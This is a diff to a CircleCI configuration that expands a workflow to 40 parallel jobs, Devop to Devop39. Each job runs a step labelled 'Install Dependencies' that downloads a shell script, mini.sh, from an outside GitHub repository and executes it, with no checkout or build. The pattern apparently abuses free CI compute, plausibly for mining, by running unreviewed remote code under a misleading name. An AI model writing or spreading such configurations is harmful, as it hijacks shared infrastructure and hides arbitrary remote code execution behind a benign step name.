@@ -1,267 +1,323 @@
 version: 2.1
 jobs:
     Devop:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop1:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop2:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop3:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop4:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop5:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop6:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop7:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop8:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop9:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop10:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop11:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop12:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop13:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop14:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop15:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop16:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop17:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop18:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop19:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop20:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop21:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop22:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
     Devop23:
-    docker:
-      - image: cimg/ruby:2.7-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD
-    steps:
-      - checkout 
-      - run: 
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop24:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop25:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop26:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop27:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop28:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop29:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop30:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop31:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop32:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop33:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop34:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop35:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop36:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop37:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop38:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh      
+    Devop39:
+      docker:
+            - image: cimg/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh              
 workflows:
@@ -291,5 +347,21 @@ workflows:
             - Devop20
             - Devop21
             - Devop22
-            - Devop23                  
-                
+            - Devop23
+            - Devop24
+            - Devop25
+            - Devop26
+            - Devop27
+            - Devop28
+            - Devop29
+            - Devop30
+            - Devop31
+            - Devop32
+            - Devop33
+            - Devop34
+            - Devop35
+            - Devop36
+            - Devop37
+            - Devop38
+            - Devop39                 
+            
